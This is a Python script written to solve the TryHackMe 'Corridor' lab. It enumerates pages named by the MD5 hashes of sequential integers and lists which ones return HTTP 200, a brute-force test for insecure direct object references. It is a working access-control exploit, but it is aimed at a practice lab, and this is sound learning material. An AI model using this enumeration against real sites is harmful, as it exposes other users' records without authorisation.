#!/usr/bin/env python3
"""
IDOR Testing Script - Batch Test Sequential Hashes
Corridor Challenge - TryHackMe

Usage:
    python3 idor_test.py <base_url> [range_start] [range_end]
    
Examples:
    python3 idor_test.py http://10.67.168.239
    python3 idor_test.py http://10.67.168.239 -100 200
"""

import hashlib
import requests
import sys
from typing import Dict, List, Tuple

class IDORTester:
    def __init__(self, base_url: str, verbose: bool = False):
        self.base_url = base_url.rstrip('/')
        self.verbose = verbose
        self.found_endpoints = {}
        self.timeout = 5

    def generate_md5(self, value: str) -> str:
        """Generate MD5 hash of a string."""
        return hashlib.md5(value.encode()).hexdigest()

    def test_endpoint(self, test_id: int) -> Tuple[int, int, str]:
        """Test a single endpoint by ID."""
        md5_hash = self.generate_md5(str(test_id))
        url = f"{self.base_url}/{md5_hash}"
        
        try:
            response = requests.get(url, timeout=self.timeout)
            status = response.status_code
            size = len(response.text)
            
            if self.verbose:
                print(f"[{status}] ID={test_id:4d} | Hash={md5_hash} | Size={size}")
            
            return status, size, md5_hash
            
        except requests.exceptions.Timeout:
            if self.verbose:
                print(f"[TIMEOUT] ID={test_id}")
            return 0, 0, md5_hash
        except Exception as e:
            if self.verbose:
                print(f"[ERROR] ID={test_id}: {str(e)}")
            return 0, 0, md5_hash

    def test_range(self, start: int = -10, end: int = 200) -> None:
        """Test a range of IDs."""
        print(f"=== IDOR Testing: {self.base_url} ===")
        print(f"Testing range: {start} to {end}\n")
        
        status_200 = []
        status_other = {}
        
        for test_id in range(start, end + 1):
            status, size, hash_val = self.test_endpoint(test_id)
            
            if status == 200:
                status_200.append((test_id, hash_val, size))
                print(f"[200] ID={test_id:4d} | Size={size:4d} bytes | Hash={hash_val}")
            elif status > 0 and status not in status_other:
                status_other[status] = 1
        
        self.print_summary(status_200, status_other)

    def print_summary(self, found: List[Tuple[int, str, int]], other_statuses: Dict) -> None:
        """Print test summary."""
        print("\n" + "="*70)
        print(f"SUMMARY")
        print("="*70)
        print(f"\nAccessible Endpoints (HTTP 200): {len(found)}")
        
        for test_id, hash_val, size in found:
            print(f"  ID={test_id:4d} | Hash={hash_val} | Size={size}")
        
        if other_statuses:
            print(f"\nOther Status Codes: {other_statuses}")

def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    
    base_url = sys.argv[1]
    start = int(sys.argv[2]) if len(sys.argv) > 2 else -10
    end = int(sys.argv[3]) if len(sys.argv) > 3 else 200
    
    tester = IDORTester(base_url, verbose=True)
    tester.test_range(start, end)

if __name__ == "__main__":
    main()
